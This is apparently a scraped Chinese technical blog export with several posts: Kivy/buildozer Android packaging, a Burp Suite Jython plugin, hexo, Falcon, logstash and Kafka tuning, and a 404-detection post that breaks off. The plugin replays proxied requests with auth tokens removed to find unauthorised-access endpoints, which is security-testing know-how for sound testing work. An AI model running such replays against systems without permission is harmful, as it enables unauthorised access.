2.7.10 (default, Jul 15 2017, 17:16:57)[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] on darwinType “help”, “copyright”, “credits” or “license” for more information.&gt;&gt;&gt;&gt;&gt;&gt; import kivy[INFO ] [Logger ] Record log in /Users/didi/.kivy/logs/kivy_18-05-08_4.txt[INFO ] [Kivy ] v1.10.1.dev0, git-5f6c66e, 20180507[INFO ] [Python ] v2.7.10 (default, Jul 15 2017, 17:16:57)[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] 说明：导入kivy模块没有报错则说明安装成功。 install kivy for centos7先安装依赖： 123456789101112131415161718yum install \\ make \\ mercurial \\ automake \\ gcc \\ gcc-c++ \\ SDL_ttf-devel \\ SDL_mixer-devel \\ khrplatform-devel \\ mesa-libGLES \\ mesa-libGLES-devel \\ gstreamer-plugins-good \\ gstreamer \\ gstreamer-python \\ mtdev-devel \\ python-devel \\ python-pip \\ java-devel 安装cython以及kivy: 12pip install Cython==0.20pip install kivy centos安装kivy参考：https://kivy.org/docs/installation/installation-linux.html#using-software-packages 说明：其他安装kivy方式可移步：https://kivy.org/#download（需要翻墙） 用kivy开发第一个python app安装完kivy就可以开发app程序了，这里演示下hello-world程序，关于kivy更复杂的用法不是本文重点，后面再成文介绍。1) 创建一个main.py文件，写入： 123456789#! -- coding:utf-8 --from kivy.app import Appclass HelloApp(App): passif name == ‘main‘: HelloApp().run() 2)创建一个hello.kv文件，写入： 12Label: text: ‘Hello, World! I am nMask’ 简单说明：main.py是入口函数，定义了一个HelloApp类，该类继承kivy.app；hello.kv文件是kivy程序，相当于定义界面风格等，该文件命名规则为类名小写且去除app。 运行第一个python app1python main.py 运行结果： 安装buildozer工具 通过以上的编码，我创建了自己的第一个python app程序，该程序可以直接在mac、linux、windows平台下运行，那么如何让它在安卓或者苹果手机上运行呢？我们知道在安卓上运行，需要将其打包成apk安装程序，因此就需要用到前面提到过的buildozer工具，（buildozer工具可以打包kivy程序，支持android、ios等），buildozer的安装过程比较简单： 1pip install buildozer 使用buildozer工具将kivy程序打包成apk在python项目目录下运行： 1buildozer init 运行成功将会创建一个配置文件buildozer.spec，可以通过修改配置文件更改app的名称等，然后运行： 1buildozer android debug deploy run 运行以上命令将会生成跨平台的安装包，可适用安卓、ios等，如果用于安卓，则是利用python-for-android项目。 在第一次运行以上命令的时候，会自动在系统中下载安卓sdk等必要文件，如下图。（过程需要翻墙，而且有很多依赖需要下载） 说明：这里只演示打包成apk文件，iso平台的可自行研究，参考文档：https://github.com/kivy/buildozer。 python apk程序测试如果以上步骤都运行成功的话，应该会在项目目录下的bin目录下生成一个apk文件，类似如下： 然后将apk下载到安卓系统的手机上，安装即可，测试效果如下：打开app： buildozer使用说明1234567891011121314151617181920212223242526272829303132333435363738394041Usage: buildozer [–profile &lt;name&gt;] [–verbose] [target] &lt;command&gt;… buildozer –versionAvailable targets: android Android target, based on python-for-android project ios iOS target, based on kivy-ios project android_old Android target, based on python-for-android project (old toolchain)Global commands (without target): distclean Clean the whole Buildozer environment. help Show the Buildozer help. init Create a initial buildozer.spec in the current directory serve Serve the bin directory via SimpleHTTPServer setdefault Set the default command to run when no arguments are given version Show the Buildozer versionTarget commands: clean Clean the target environment update Update the target dependencies debug Build the application in debug mode release Build the application in release mode deploy Deploy the application on the device run Run the application on the device serve Serve the bin directory via SimpleHTTPServerTarget “android_old” commands: adb Run adb from the Android SDK. Args must come after –, or use –alias to make an alias logcat Show the log from the deviceTarget “ios” commands: list_identities List the available identities to use for signing. xcode Open the xcode project.Target “android” commands: adb Run adb from the Android SDK. Args must come after –, or use –alias to make an alias logcat Show the log from the device p4a Run p4a commands. Args must come after –, or use –alias to make an alias buildozer打包过程中的坑点如果在打包过程中遇到报错，可以修改buildozer.spec配置文件中的log_level为2，然后重新运行，可以看具体的错误信息。 报错：You might have missed to install 32bits libs这个错是我在centos7上运行时报的错，大意是系统缺少了某些32位的依赖文件。解决方案： 1yum -y install –skip-broken glibc.i686 arts.i686 audiofile.i686 bzip2-libs.i686 cairo.i686 cyrus-sasl-lib.i686 dbus-libs.i686 directfb.i686 esound-libs.i686 fltk.i686 freeglut.i686 gtk2.i686 hal-libs.i686 imlib.i686 lcms-libs.i686 lesstif.i686 libacl.i686 libao.i686 libattr.i686 libcap.i686 libdrm.i686 libexif.i686 libgnomecanvas.i686 libICE.i686 libieee1284.i686 libsigc++20.i686 libSM.i686 libtool-ltdl.i686 libusb.i686 libwmf.i686 libwmf-lite.i686 libX11.i686 libXau.i686 libXaw.i686 libXcomposite.i686 libXdamage.i686 libXdmcp.i686 libXext.i686 libXfixes.i686 libxkbfile.i686 libxml2.i686 libXmu.i686 libXp.i686 libXpm.i686 libXScrnSaver.i686 libxslt.i686 libXt.i686 libXtst.i686 libXv.i686 libXxf86vm.i686 lzo.i686 mesa-libGL.i686 mesa-libGLU.i686 nas-libs.i686 nss_ldap.i686 cdk.i686 openldap.i686 pam.i686 popt.i686 pulseaudio-libs.i686 sane-backends-libs-gphoto2.i686 sane-backends-libs.i686 SDL.i686 svgalib.i686 unixODBC.i686 zlib.i686 compat-expat1.i686 compat-libstdc++-33.i686 openal-soft.i686 alsa-oss-libs.i686 redhat-lsb.i686 alsa-plugins-pulseaudio.i686 alsa-plugins-oss.i686 alsa-lib.i686 nspluginwrapper.i686 libXv.i686 libXScrnSaver.i686 qt.i686 qt-x11.i686 pulseaudio-libs.i686 pulseaudio-libs-glib2.i686 alsa-plugins-pulseaudio.i686 python-matplotli 参考：https://ask.fedoraproject.org/en/question/9556/how-do-i-install-32bit-libraries-on-a-64-bit-fedora/ 报错：Error compiling Cython file错误大意为cython文件出错，可能是cython模块没有安装，或者版本有问题。解决方案： 1pip install cython==0.25 报错：IOError: [Errno 2] No such file or directory…..这是在打包的最后一步，将apk文件copy到项目bin目录下时报的错，是buildozer的一个bug。解决方案：修改/usr/local/lib/python2.7/dist-packages/buildozer/tagets/android.py文件：(1)在文件开头导入: 1from distutils.version import LooseVersion (2) 将786行:XXX found how the apk name is really built from the title这一行以下的代码替换为： 123456sdk_dir = self.android_sdk_dirbuild_tools_versions = os.listdir(join(sdk_dir, ‘build-tools’))build_tools_versions = sorted(build_tools_versions, key=LooseVersion)build_tools_version = build_tools_versions[-1]gradle_files = [“build.gradle”, “gradle”, “gradlew”]is_gradle_build = any((exists(join(dist_dir, x)) for x in gradle_files)) and build_tools_version &gt;= ’25.0‘ buildozer虚拟机 kivy官方推出了一个buildozer虚拟机镜像，已经安装好了buildozer以及一些依赖文件，为buildozer打包测试提供平台。由于之前我在mac上利用buildozer打包一直报错，后来换成centos也依然没有成功，因此便下载了此虚拟机，测试效果如下： 虚拟机下载地址：http://txzone.net/files/torrents/kivy-buildozer-vm-2.0.zip 说明：对于无法解决依赖问题的朋友，可以使用此虚拟机进行程序打包，开发环境还是推荐用自己的本机。 kivy开发实例 因为本文重点在于介绍如何利用kivy+buildozer开发一款python app，因此对于kivy的开发过程，以及app功能进行了最简化。想要学习如何开发更复杂的app，可参考：https://muxuezi.github.io/posts/kivy-perface.html# ～！～ 折腾python使我快乐，……，想想还是滚回去学java吧 ～！～","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"python开发app","slug":"python开发app","permalink":"http://chucz.club/tags/python开发app/"},{"name":"android for python","slug":"android-for-python","permalink":"http://chucz.club/tags/android-for-python/"}]},{"title":"burpsuite插件开发之检测越权访问漏洞","slug":"burpsuite插件开发之检测越权访问漏洞","date":"2018-05-04T00:26:28.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/05/04/burpsuite插件开发之检测越权访问漏洞/","link":"","permalink":"http://chucz.club/2018/05/04/burpsuite插件开发之检测越权访问漏洞/","excerpt":"","text":"那个喝醉的夜晚，挡不住我们的步伐 前些天公司买了些BurpSuite的License，终于可以用上正版了，先给公司来波赞！好啦，言归正传，BurpSuite作为Web安全测试的一大神器，其中一个优势就是其扩展性好。BurpSuite支持Java、Python、Ruby作为其插件的扩展语言，而在其内置的Bapp_Store中也有很多很强大的插件。作为一名程序猿，心想是时候自己动手开发一款专属插件了，抱着此心态我便开始尝试学习摸索着Coding，于是便有了此文。 插件语言的选择 以上所述Burp支持Java、Python、Ruby语言的扩展，相对来说我更熟悉Python，因此就用Python开始学习写插件，对于速度要求高的朋友可以用Java写。熟悉Python的朋友肯定知道，Python分为Cython、Jython等。前者就是我们通常所说的Python，后者是Java版本的Python，简单理解就是用Jython可以调用Java的库。 burpsuite jython开发环境 想要开发使用一款属于自己的BurpSuite插件，必须要部署好Jython开发环境以及Jython运行环境。前者需要在开发jython程序的平台上搭建环境，后者需要在运行burpsuite的平台搭建环境。鉴于一般开发以及使用插件都在用一个平台上，比如mac，因此本文介绍一下如何在mac上安装jython环境。 install jython for Mac首先我们需要在mac上安装jython的环境以便开发jython程序，就像安装python环境一样，mac上安装jython命令： 1brew install jython 安装完以后，jython安装在/usr/local/Cellar/jython/目录下，需要设置环境变量，将/usr/local/Cellar/jython/2.7.1/libexec/bin添加到环境变量，然后在shell中输入： 12345$jythonJython 2.7.1 (default:0df7adb1b397, Jun 30 2017, 19:02:43)[Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on java1.8.0_111Type “help”, “copyright”, “credits” or “license” for more information.&gt;&gt;&gt; 说明：其他平台（windows，linux）安装jython方式请自行google，应该比较类似。 Load Jython to Burpsuitemac上安装完jython环境后，需要在burpsuite中加载jython环境，注意这里选择的是jar文件。 开发jython程序本篇以开发一款检测未授权访问漏洞的插件为例介绍一下插件的开发过程，由于本文重点在于介绍如何开发一款bp插件，以及一些不可抗因素，本文介绍的插件均为简化后的版本。 创建main.py文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#! -- coding:utf-8 --import refrom burp import IBurpExtender # 定义插件的基本信息类from burp import IHttpListener # http流量监听类from noauth import noauth_request# 敏感接口检测，并输出敏感接口信息res_host = re.compile(r‘Host: ([^,])’)res_path = re.compile(r‘(GET|POST) ([^ ]) HTTP/‘)class BurpExtender(IBurpExtender, IHttpListener): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() # 通用函数 self._callbacks.setExtensionName(“sensitive_interface_scan”) print “load sensitive_interface_scan plugin success!” print “=============================================” print “” # register ourselves as an HTTP listener callbacks.registerHttpListener(self) def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo): if toolFlag == 4: if not messageIsRequest: response = messageInfo.getResponse() # get response analyzedResponse = self._helpers.analyzeResponse(response) body = response[analyzedResponse.getBodyOffset():] body_string = body.tostring() # get response_body request = messageInfo.getRequest() analyzedRequest = self._helpers.analyzeResponse(request) request_header = analyzedRequest.getHeaders() try: method,path = res_path.findall(request_header[0])[0] host = res_host.findall(request_header[1])[0] url = method+“ “+host+path except: url = “” if method==“GET”: # 检测GET请求的接口 print “[Info]Check url is “,url cur = noauth_request(host,path,body_string) noauth_result = cur.run() if noauth_result: print “[Info]Found it is a noauth Interface %s” % noauth_result[0][0] print “[Info]remove param is “,noauth_result[0][1] print “======================================================================================” print “” 说明：此文件为插件入口文件，其中导入的burp内置类IBurpExtender为基类，即所有插件都需要使用继承此类，IHttpListener类用来获取http请求以及响应内容。 创建noauth.py文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#! -- coding:utf-8 --‘’‘未授权访问poc(GET)’‘’import requestsfrom furl import furlauth_params=[“token”,“sign”,“ticket”]# headers 里面除去cookieheaders=&#123; “User-Agent”:“Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36”, “Accept-Language”:“zh-CN,zh;q=0.9,en;q=0.8,mt;q=0.7,zh-TW;q=0.6”, “Accept-Encoding”:“gzip, deflate”, “Accept”:“text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8”, “Cookie”:“test”,&#125;class noauth_request(object): # 未授权访问漏洞检测 def init(self,host,path,body_string): self.url = “http://“+host+path self.uri = str(furl(self.url).remove(args=True)) self.body_string = body_string self.param = dict(furl(self.url).args) self.remove_param = [] def run(self): result_list=[] self.remove_auth() # remove params,example:auth,token,sign…… response_body,current_url = self.get_response() if response_body == self.body_string: result_list.append((current_url,self.remove_param,response_body)) return result_list def remove_auth(self): # 删除用户认证的参数 for i in auth_params: if self.param.has_key(i): self.remove_param.append(i) self.param.pop(i) def get_response(self): # 重放接口获取返回值 current_url = “” response_body = “” try: res=requests.get(url=self.uri, params=self.param, timeout=20, headers=headers) except Exception,e: print “[noauth_request:get_response]”+str(e) if “HTTPSConnectionPool” in str(e): try: res=requests.get(url=self.uri.replace(“http://“,“https://“), params=self.param, timeout=20, headers=headers) except Exception,e: print “[noauth_request:get_response]”+str(e) else: current_url = res.url response_body = res.text else: current_url = res.url response_body = res.text return response_body,current_url 说明：此文件为检测未授权访问类，功能比较简单，获取原始请求以及响应包，去除请求接口的cookie以及token等认证后重放，查看返回结果有没有变化。一般情况下还会检测响应包是否包含敏感信息，这里为了方便演示，简化了插件功能。 将jython程序添加到burpsuite中选择添加一个插件：注意下图中的标记部分：说明：类型选择python，文件选择入口文件，burpsuite会自动获取本地的依赖文件；输出这里选择在控制台输出，因为此插件没有写ui界面。 加载成功后，会在控制台输出： 然后我们就去开启浏览器代理，关闭bp拦截，愉快的进行web系统测试吧，若插件检测到了未授权访问的接口，则会输出类似如下： 增加UI界面代码在控制台输出的方式总归没有那么优雅，因此如果能像其内置的功能那样在界面上输出就更好了。以下是一段简单的ui界面开发代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# -- coding:utf-8 --# 导入 burp 接口from burp import IBurpExtender, ITab# 导入 Java 库from javax.swing import JPanelfrom javax.swing import JButtonclass BurpExtender(IBurpExtender, ITab): ‘’‘ 继承burp java父类 ‘‘’ def registerExtenderCallbacks(self, callbacks): # 注册插件信息 self._cb = callbacks # 回调 self._hp = callbacks.getHelpers() # 帮助信息 self._cb.setExtensionName(‘python_test_plugin’) # 插件名称 print ‘load python_test_plugin success!’ self.mainPanel = JPanel() # 面板 self.testBtn = JButton(u‘一个按钮’, actionPerformed=self.testBtn_onClick) # 初始化一个 JButton 并绑定单击事件 self.mainPanel.add(self.testBtn) # 面板中添加这个按钮 self._cb.customizeUiComponent(self.mainPanel) self._cb.addSuiteTab(self) def testBtn_onClick(self, event): # 点击按钮事件 print “click button” def getTabCaption(self): # 获取tab按钮名称 return ‘python_test_plugin’ def getUiComponent(self): # 获取面板内容· return self.mainPanel 说明：这只是一个ui界面开发的demo，效果如下： burp插件开发文档这里介绍几个常用的burp类： 1234567891011121. 插件入口和帮助接口类：IBurpExtender、IBurpExtenderCallbacks、IExtensionHelpers、IExtensionStateListenerIBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且类命名为BurpExtender。 IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider……）、各个通信对象（HttpRequestResponse、HttpService、SessionHandlingAction）之间的纽带。 IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。2. UI相关接口类：IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、IMessageEditor、IMenuItemHandler这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。3. Burp工具组件接口类：IInterceptedProxyMessage、IIntruderAttack、IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。4. HTTP消息处理接口类：ICookie、IHttpListener、IHttpRequestResponse、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、IRequestInfo、IParameter、IResponseInfo这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。 关于更多关于burp开发相关的文档，可以参考下：https://portswigger.net/burp/extender/ 本文参考http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/ 写不动了~","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"burpsuite","slug":"burpsuite","permalink":"http://chucz.club/tags/burpsuite/"}]},{"title":"hexo修改默认端口","slug":"hexo修改默认端口","date":"2018-04-20T00:29:31.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/04/20/hexo修改默认端口/","link":"","permalink":"http://chucz.club/2018/04/20/hexo修改默认端口/","excerpt":"","text":"默认使用4000端口，用hexo s -p 80 ，可以暂时修改启动端口。 但是每次启动都要写”-p 80”才行，过于繁琐。 修改方法：找到node_modules\\hexo-server\\index.js文件，可以修改默认的port值！","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://chucz.club/tags/hexo/"}]},{"title":"Falcon For Python REST API","slug":"Falcon-For-Python-REST-API","date":"2018-04-18T00:02:35.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/04/18/Falcon-For-Python-REST-API/","link":"","permalink":"http://chucz.club/2018/04/18/Falcon-For-Python-REST-API/","excerpt":"","text":"一杯敬明天，一杯敬过往 说到Web Api，以往我一直使用Django来写，但众所周知Django框架很厚重，用来写web Api未免显得不够简便。虽然Django有一个专门写Api的框架，Django REST Framework（适合写比较复杂的Api，后面我会单独成文介绍），但感觉还是偏厚重了点。那么有没有几行代码就能写出一个Api的方案呢？Falcon框架就是为此而生的。(除此之外，Flask等框架也可用来写Api，但个人认为最轻便的就属Falcon了) Falcon是一个构建云Api的高性能Python框架，它鼓励使用REST架构风格，尽可能以最少的力气做最多的事情，简单来说它就是用来写Web Api的，有多简便，往下看了就知道。 Falcon官方文档：http://falcon.readthedocs.io/en/stable/api/request_and_response.htmlFalcon开源地址：https://github.com/falconry/falcon Falcon安装1pip install falcon Falcon写一个简单的api新建一个app.py文件，写入以下内容： 123456789101112131415161718192021222324252627282930from wsgiref import simple_serverimport falconclass HelloWorld(object): def on_get(self, req, resp): print req.context print req.scheme print req.params resp.status = falcon.HTTP_200 resp.body = (‘Get hello world’) def on_post(self, req, resp): print req.stream.read() 获取post_data resp.status = falcon.HTTP_200 resp.body = (‘Post hello world’)app = falcon.API()hello = HelloWorld()app.add_route(‘/‘, hello)if name == ‘main‘: httpd = simple_server.make_server(‘127.0.0.1’, 8000, app) httpd.serve_forever() 运行app.py文件： 1python app.py 运行程序将会在本地监听8000端口，我们可以使用curl或者http工具测试一番：先发一个GET请求： 123456789http GET http://127.0.0.1:8000/HTTP/1.0 200 OKDate: Mon, 27 Nov 2017 11:50:36 GMTServer: WSGIServer/0.1 Python/2.7.10content-length: 15content-type: application/json; charset=UTF-8Get hello world 尝试发POST请求： 123456789http POST http://127.0.0.1:8000/HTTP/1.0 200 OKDate: Mon, 27 Nov 2017 11:50:45 GMTServer: WSGIServer/0.1 Python/2.7.10content-length: 16content-type: application/json; charset=UTF-8Post hello world 说明：Falcon支持任何类型的请求，比如OPTIONS，PUT，HEAD等，当然前提是需要在app.py代码中定义，定义方式为on_*，比如：on_get、on_post、on_put等。 更复杂一些的api例子，可以参考官网。关于request与response的一些方法，官网有很详细的介绍，这里不再记录。 使用gunicorn代替内置的服务器使用python app.py的方式运行api，其实是使用了其内置的服务器，类似于django的manage.py。用于生产环境时，通常会使用gunicorn来代替内置的服务器，当然代码也可以简略为： 12345678910111213141516171819202122import falconclass HelloWorld(object): def on_get(self, req, resp): print req.context print req.scheme print req.params resp.status = falcon.HTTP_200 resp.body = (‘Get hello world’) def on_post(self, req, resp): resp.status = falcon.HTTP_200 resp.body = (‘Post hello world’)app = falcon.API()hello = HelloWorld()app.add_route(‘/‘, hello) 安装gunicorn1pip install gunicorn 使用gunicorn1gunicorn app:app -b 127.0.0.1:8080 注意：:前的app是指app.py，:后的app是指app.py文件中的app对象。 gunicorn只支持unix（linux、mac），如果是windows用户，可用waitress替代。 12$ pip install waitress$ waitress-serve –port=8000 app:app 关于gunicorn更多的用法，比如指定端口号之类的，可以gunicorn --help查看帮助。","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"python","slug":"python","permalink":"http://chucz.club/tags/python/"},{"name":"falcon","slug":"falcon","permalink":"http://chucz.club/tags/falcon/"}]},{"title":"logstash吞吐率优化","slug":"logstash吞吐率优化","date":"2018-04-13T01:03:34.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/04/13/logstash吞吐率优化/","link":"","permalink":"http://chucz.club/2018/04/13/logstash吞吐率优化/","excerpt":"","text":"问题一最近发现kibana的日志传的很慢，常常查不到日志，由于所有的日志收集都只传输到了一个logstash进行收集和过滤，于是怀疑是否是由于logstash的吞吐量存在瓶颈。一看，还真是到了瓶颈。 优化过程经过查询logstash完整配置文件，有几个参数需要调整 12345678# pipeline线程数，官方建议是等于CPU内核数pipeline.workers: 24# 实际output时的线程数pipeline.output.workers: 24# 每次发送的事件数pipeline.batch.size: 3000# 发送延时pipeline.batch.delay: 5 PS:由于我们的ES集群数据量较大（&gt;28T），所以具体配置数值视自身生产环境 优化结果ES的吞吐由每秒9817/s提升到41183/s,具体可以通过x-pack的monitor查看。 问题二在查看logstash日志过程中，我们看到了大量的以下报错 12[2017-03-18T09:46:21,043][INFO ][logstash.outputs.elasticsearch] retrying failed action with response code: 429 (&#123;”type”=&gt;”esrejectedexecution_exception”, “reason”=&gt;”rejected execution of org.elasticsearch.transport.TransportService$6@6918cf2e on EsThreadPoolExecutor[bulk, queue capacity = 50, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@55337655[Running, pool size = 24, active threads = 24, queued tasks = 50, completed tasks = 1767887463]]”&#125;)[2017-03-18T09:46:21,043][ERROR][logstash.outputs.elasticsearch] Retrying individual actions 查询官网，确认为时ES的写入遇到了瓶颈 1Make sure to watch for TOO_MANY_REQUESTS (429) response codes (EsRejectedExecutionException with the Java client), which is the way that Elasticsearch tells you that it cannot keep up with the current indexing rate. When it happens, you should pause indexing a bit before trying again, ideally with randomized exponential backoff. 我们首先想到的是来调整ES的线程数，但是官网写到”Don’t Touch There Settings!”, 那怎么办？于是乎官方建议我们修改logstash的参数pipeline.batch.size 在ES5.0以后，es将bulk、flush、get、index、search等线程池完全分离，自身的写入不会影响其他功能的性能。来查询一下ES当前的线程情况： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647GET _nodes/stats/thread_pool?pretty&#123; “_nodes”: &#123; “total”: 6, “successful”: 6, “failed”: 0 &#125;, “cluster_name”: “dev-elasticstack5.0”, “nodes”: &#123; “nnfCv8FrSh-p223gsbJVMA”: &#123; “timestamp”: 1489804973926, “name”: “node-3”, “transport_address”: “192.168.3.:9301”, “host”: “192.168.3.“, “ip”: “192.168.3.***:9301”, “roles”: [ “master”, “data”, “ingest” ], “attributes”: &#123; “rack”: “r1” &#125;, “thread_pool”: &#123; “bulk”: &#123; “threads”: 24, “queue”: 214, “active”: 24, “rejected”: 30804543, “largest”: 24, “completed”: 1047606679 &#125;, …… “watcher”: &#123; “threads”: 0, “queue”: 0, “active”: 0, “rejected”: 0, “largest”: 0, “completed”: 0&#125;&#125;&#125;&#125;&#125; 其中：”bulk”模板的线程数24，当前活跃的线程数24，证明所有的线程是busy的状态，queue队列214，rejected为30804543。那么问题就找到了，所有的线程都在忙，队列堵满后再有进程写入就会被拒绝，而当前拒绝数为30804543。 优化方案问题找到了，如何优化呢。官方的建议是提高每次批处理的数量，调节传输间歇时间。当batch.size增大，es处理的事件数就会变少，写入也就越快了。 123456vim /etc/logstash/logstash.yml#pipeline.workers: 24pipeline.output.workers: 24pipeline.batch.size: 10000pipeline.batch.delay: 10 具体的worker/output.workers数量建议等于CPU数，batch.size/batch.delay根据实际的数据量逐渐增大来测试最优值。","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"}]},{"title":"kafka性能调优","slug":"kafka性能调优","date":"2018-04-13T00:47:49.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/04/13/kafka性能调优/","link":"","permalink":"http://chucz.club/2018/04/13/kafka性能调优/","excerpt":"","text":"Kafka的配置详尽、复杂，想要进行全面的性能调优需要掌握大量信息，这里只记录一下我在日常工作使用中走过的坑和经验来对kafka集群进行优化常用的几点。1.JVM的优化java相关系统自然离不开JVM的优化。首先想到的肯定是Heap Size的调整。 vim bin/kafka-server-start.sh 调整KAFKA_HEAP_OPTS=”-Xmx16G -Xms16G”的值推荐配置：一般HEAP SIZE的大小不超过主机内存的50%。 2.网络和ios操作线程配置优化：1234# broker处理消息的最大线程数num.network.threads=9# broker处理磁盘IO的线程数num.io.threads=16 推荐配置：num.network.threads主要处理网络io，读写缓冲区数据，基本没有io等待，配置线程数量为cpu核数加1。 num.io.threads主要进行磁盘io操作，高峰期可能有些io等待，因此配置需要大些。配置线程数量为cpu核数2倍，最大不超过3倍。 3.socket server可接受数据大小(防止OOM异常)：socket.request.max.bytes=2147483600 推荐配置： 根据自己业务数据包的大小适当调大。这里取值是int类型的，而受限于java int类型的取值范围又不能太大： java int的取值范围为（-2147483648~2147483647），占用4个字节（-2的31次方到2的31次方-1，不能超出，超出之后报错：org.apache.kafka.common.config.ConfigException: Invalid value 8589934592 for configuration socket.request.max.bytes: Not a number of type INT。 4.log数据文件刷盘策略—每当producer写入10000条消息时，刷数据到磁盘—log.flush.interval.messages=10000 —每间隔1秒钟时间，刷数据到磁盘—log.flush.interval.ms=1000 推荐配置： 为了大幅度提高producer写入吞吐量，需要定期批量写文件。一般无需改动，如果topic的数据量较小可以考虑减少log.flush.interval.ms和log.flush.interval.messages来强制刷写数据，减少可能由于缓存数据未写盘带来的不一致。推荐配置分别message 10000，间隔1s。 5.日志保留策略配置—日志保留时长—log.retention.hours=72 —段文件配置—log.segment.bytes=1073741824 推荐配置： 日志建议保留三天，也可以更短；段文件配置1GB，有利于快速回收磁盘空间，重启kafka加载也会加快（kafka启动时是单线程扫描目录(log.dir)下所有数据文件）。如果文件过小，则文件数量比较多。 6.replica复制配置123num.replica.fetchers=3replica.fetch.min.bytes=1replica.fetch.max.bytes=5242880 推荐配置： 每个follow从leader拉取消息进行同步数据，follow同步性能由这几个参数决定，分别为: 拉取线程数(num.replica.fetchers):fetcher配置多可以提高follower的I/O并发度，单位时间内leader持有更多请求，相应负载会增大，需要根据机器硬件资源做权衡，建议适当调大； 最小字节数(replica.fetch.min.bytes):一般无需更改，默认值即可； 最大字节数(replica.fetch.max.bytes)：默认为1MB，这个值太小，推荐5M，根据业务情况调整 最大等待时间(replica.fetch.wait.max.ms):follow拉取频率，频率过高，leader会积压大量无效请求情况，无法进行数据同步，导致cpu飙升。配置时谨慎使用，建议默认值，无需配置。 7.分区数量配置num.partitions=5 推荐配置： 默认partition数量1，如果topic在创建时没有指定partition数量，默认使用此值。Partition的数量选取也会直接影响到Kafka集群的吞吐性能，配置过小会影响消费性能，建议改为5。","categories":[],"tags":[{"name":"Kafka","slug":"Kafka","permalink":"http://chucz.club/tags/Kafka/"}]},{"title":"基于余弦相似性的404页面识别","slug":"基于余弦相似性的404页面识别","date":"2018-04-12T17:44:08.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/04/12/基于余弦相似性的404页面识别/","link":"","permalink":"http://chucz.club/2018/04/12/基于余弦相似性的404页面识别/","excerpt":"","text":"也许老街的腔调，是属于我的忧伤 写过爬虫或者漏洞扫描器的朋友肯定遇到过一个问题，就是如何判断一个url对应的页面是个404页面，因为这对之后的逻辑判断尤为重要。然而由于存在一些特殊情况，导致404页面判断没有想象中的那么简单，这往往跟服务器配置有关。本篇作为《漫谈漏洞扫描器的设计与开发》的一个分支文章，重点谈谈如何判断一个页面是否为404页面。 404页面 一般情况下，判断一个网页是否为404页面，主要看其返回的响应码。若响应码为404，则说明这是一个不存在的页面，若不是则说明是一个存在的页面。然而出于对用户的友好，有些网站往往会优化404页面，大致有以下几种优化方式。 跳转到指定页面 第一种优化方式是：一旦用户访问了一个不存在的页面，服务器会将请求跳转到一个指定的url，往往是网站首页，或者是网站登陆页面。这种情况下，请求一个不存在的页面的响应码会从302变为200（服务端跳转），或者响应码直接为200（客户端跳转，用户可感）；网页内容为网站首页或者网站登陆页面等指定页面的内容。例子：http://didichuxing.com/nmask 跳转到优化后的404页面 第二种优化方式是：一旦用户访问了一个不存在的页面，服务器会将请求跳转到404页面，与第一种方式不同的是跳转后的这个页面确实是404页面，但是是经过特殊处理优化的。这种情况下，请求一个不存在的页面的响应码会从302变为200（服务端跳转），或者响应码为200（客户端跳转），网页内容为一个经过优化的404页面内容。例子：https://www.jd.com/nmask 直接显示404页面 第三种方式是：一旦用户访问了一个不存在的页面，页面直接显示为404页面（服务器默认）。这种情况下，请求一个不存在的页面的响应码可能是404（默认情况），也可能是200，页面内容为默认404或者处理后的404页面。例子：http://www.alibaba.com/nmask 总结404页面的特征 综上所诉，一个404页面的响应码可能为：404，302，200（当然不排除有其他情况）；一个404页面的页面内容可能是：网站首页内容（指定页面）、优化后的404页面内容、服务器默认的404页面内容。 如何科学的判断一个404页面？综上所诉，我们大致可以得到这样的判断逻辑：(伪代码如下) 123456if 响应码 == 404: return this_is_404_pageelif 目标网页内容 与 